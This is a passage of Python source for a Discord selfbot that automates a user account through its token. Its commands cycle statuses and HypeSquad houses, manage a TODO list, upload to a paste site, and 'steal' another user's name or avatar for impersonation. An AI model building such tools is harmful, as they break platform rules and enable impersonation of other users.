            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            embed2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Languages', description=f'\n'.join([f"**[**{position + 80}**]** {theme}" for position, theme in enumerate(le_languages[80:])]),timestamp=embed_timestamp())
            embed2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed2)


        
    @React.command(usage="language <Language ID>", description="Selects a language")    
    async def language(ctx, number: int):
        le_languages = []
        for filename in os.listdir('Languages'):
            if filename.endswith(".json"):
                le_languages.append(filename[:-5])
                
        currenttheme = le_languages[number]
        
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data["language"] = le_languages[number]
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)

        try:
            with open(f'./Languages/{json.load(open("""config.json""", encoding="""utf-8"""))["""language"""]}.json', "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
            
            for key, value in data.items():
                current_command = key
                command_description = value['Description']
                command_usage = value['Usage']

                try:
                    cmd = React.get_command(f"{current_command}")
                    cmd.update(description=command_description, usage=command_usage)
                except:
                    pass
        except:
            pass
                
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Languages', description=f'Switched language to **{currenttheme}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="todolist", description="Shows the TODO list")    
    async def todolist(ctx):
        todo_list = []
        with open("TODO.json", "r") as jsonFile:
            data = json.load(jsonFile)

        for task in data['TODO']:
            todo_list.append(task)
                
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'TODO', description='\n'.join([t for t in todo_list]) or 'Nothing',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="todo <Task>", description="Adds a task to the TODO list")
    async def todo(ctx, *, task):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='TODO',timestamp=embed_timestamp())
        embed.add_field(name=f'__üìì Added Task__', value=f"{task}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("TODO.json", "r") as jsonFile:
                data = json.load(jsonFile)

            task_array = []
            for le_task in data['TODO']:
                task_array.append(le_task)
            
            if task not in task_array:
                task_array.append(task)
                
            data['TODO'] = task_array
            
            with open("TODO.json", "w") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
        except Exception:
            pass

    @React.command(usage="tododel <Task>", description="Removes a task from the TODO list")
    async def tododel(ctx, *, task):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='TODO',timestamp=embed_timestamp())
        embed.add_field(name=f'__üìì Removed Task__', value=f"{task}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("TODO.json", "r") as jsonFile:
                data = json.load(jsonFile)

            task_array = []
            for le_task in data['TODO']:
                task_array.append(le_task)
            
            if task in task_array:
                task_array.remove(task)
                
            data['TODO'] = task_array
            
            with open("TODO.json", "w") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
        except Exception:
            pass

    @React.command(usage="todoclear", description="Clears the TODO list")
    async def todoclear(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='TODO',timestamp=embed_timestamp())
        embed.add_field(name=f'__üìì Removed Task__', value=f"Every task", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("TODO.json", "r") as jsonFile:
                data = json.load(jsonFile)

            task_array = []
                
            data['TODO'] = task_array
            
            with open("TODO.json", "w") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
        except Exception:
            pass

    @React.command(usage="privatebin <Expiration(5min/10min/1hour/1day)> <Burn after reading(true/false)> <Text>", description="Uploads text to privatebin.info")
    async def privatebin(ctx, expiration: str, burn_after_reading: bool, *, text):
        try:
            send_response = privatebinapi.send("https://encryp.ch/note/", text=text, expiration=expiration, burn_after_reading=burn_after_reading)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'PrivateBin',timestamp=embed_timestamp())
            embed.add_field(name = "__üîó URL__", value=f"{send_response['full_url']}")
            embed.add_field(name = "__‚è≥ Expiration__", value=f"{expiration}", inline=False)
            embed.add_field(name = "__üî• Burn after reading__", value=f"{burn_after_reading}", inline=False)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="stealpfp <User>", description="Steals someones Discord profile picture")
    async def stealpfp(ctx, user: discord.User):
        try:
            await React.user.edit(avatar = bytes(requests.get(user.avatar_url).content), password = discord_password)
        except Exception:
            pass            

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Steal Profile Picture', description=f'Changed Discord profile picture',timestamp=embed_timestamp())
        embed.set_thumbnail(url = user.avatar_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    async def switchstatus():
        global current_status
        try:
            if current_status is not len(status_cycle_words):
                requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'custom_status': {"text": status_cycle_words[current_status]}}, headers={'Authorization': token, 'user-agent': 'Mozilla/5.0'})
                current_status = current_status + 1
            else:
                current_status = current_status - current_status
            
        except Exception:
            pass
        
    async def statusloop():
        try:
            while status_stat == 1:
                await switchstatus()
                await asyncio.sleep(3)
        except Exception:
            pass
        
    @React.command(usage="statuscycleadd <Word>", description="Adds a word to the status cycle")    
    async def statuscycleadd(ctx, *, word: str):
        status_cycle_words.append(word)
        with open('Statuses.txt', 'a+', encoding="utf-8") as f:
            try:
                f.write(word + "\n")
            except:
                pass
            f.close()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Status Cycle', description=f'Added {word}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="statuscycleclear", description="Clears the status cycle words")    
    async def statuscycleclear(ctx, *, word: str):
        status_cycle_words.clear()
        with open('Statuses.txt', 'w', encoding="utf-8") as f:
            try:
                f.write("")
            except:
                pass
            f.close()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Status Cycle', description=f'Cleared all words',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


                    
    @React.command(usage="statuscycle", description="Toggles status cycle")
    async def statuscycle(ctx):
        try:
            global status_stat
            if status_stat == 0:
                status_stat += 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Status Cycle', description='Enabled Statuscycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Enabled Statuscycle`'
                    await ctx.send(msg)
                await statusloop()
                    
            elif status_stat == 1:
                status_stat -= 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Status Cycle', description='Disabled Statuscycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Disabled Statuscycle'
                    await ctx.send(msg)
        except Exception:
            pass


    async def switchonlinestatus():
        global current_online_status

        onlinestatuses = [
            "dnd",
            "online",
            "invisible",
            "idle",
            "offline"
        ]

        try:
            if current_online_status is not len(onlinestatuses):
                requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'status': onlinestatuses[current_online_status]}, headers={'Authorization': token, 'user-agent': 'Mozilla/5.0'})
                current_online_status = current_online_status + 1
            else:
                current_online_status = current_online_status - current_online_status
            
        except Exception:
            pass
        
    async def onlinestatusloop():
        try:
            global online_status_cycle_stat
            while online_status_cycle_stat == 1:
                await switchonlinestatus()
                await asyncio.sleep(5)
        except Exception:
            pass
                    
    @React.command(usage="onlinestatuscycle", description="Toggles online status cycle")
    async def onlinestatuscycle(ctx):
        try:
            global online_status_cycle_stat
            if online_status_cycle_stat == 0:
                online_status_cycle_stat += 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Online Status Cycle', description='Enabled Online status cycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Enabled Online status cycle`'
                    await ctx.send(msg)
                await onlinestatusloop()
                    
            elif online_status_cycle_stat == 1:
                online_status_cycle_stat -= 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Online Status Cycle', description='Disabled Online status cycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Disabled Online status cycle'
                    await ctx.send(msg)
        except Exception:
            pass

    async def switchhouse():
        global current_hypesquad

        hypesquadhouses = [
            1,
            2, 
            3
        ]

        try:
            if current_hypesquad is not len(hypesquadhouses) + 1:
                requests.post('https://discord.com/api/v8/hypesquad/online', json={'house_id': current_hypesquad}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                current_hypesquad = current_hypesquad + 1
            else:
                current_hypesquad = current_hypesquad - current_hypesquad
            
        except Exception as e:
            print(e)
        
    async def hypesquadloop():
        try:
            global hypesquad_cycle_stat
            while hypesquad_cycle_stat == 1:
                await switchhouse()
                await asyncio.sleep(30)
        except Exception:
            pass
                    
    @React.command(usage="hypesquadcycle", description="Cycle HypeSquad houses")
    async def hypesquadcycle(ctx):
        try:
            global hypesquad_cycle_stat
            if hypesquad_cycle_stat == 0:
                hypesquad_cycle_stat += 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'HypeSquad Cycle', description='Enabled HypeSquad cycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Enabled HypeSquad cycle`'
                    await ctx.send(msg)
                await hypesquadloop()
                    
            elif hypesquad_cycle_stat == 1:
                hypesquad_cycle_stat -= 1
                if True:
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'HypeSquad Cycle', description='Disabled HypeSquad cycle',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'`Disabled HypeSquad cycle'
                    await ctx.send(msg)
        except Exception:
            pass            
        
        
    @React.command(usage="stealname <User>", description="Steals someones Discord username")
    async def stealname(ctx, user: discord.User):
        try:
            await React.user.edit(username = user.name, password = discord_password)
        except Exception:
            pass

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Steal Name', description=f'Changed Discord username to **{user.name}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="setusername <Name>", description="Sets your Discord username")
    async def setusername(ctx, *, name):
        try:
            await React.user.edit(username = name, password = discord_password)
        except Exception:
            pass

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Set Username', description=f'Changed Discord username to **{name}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
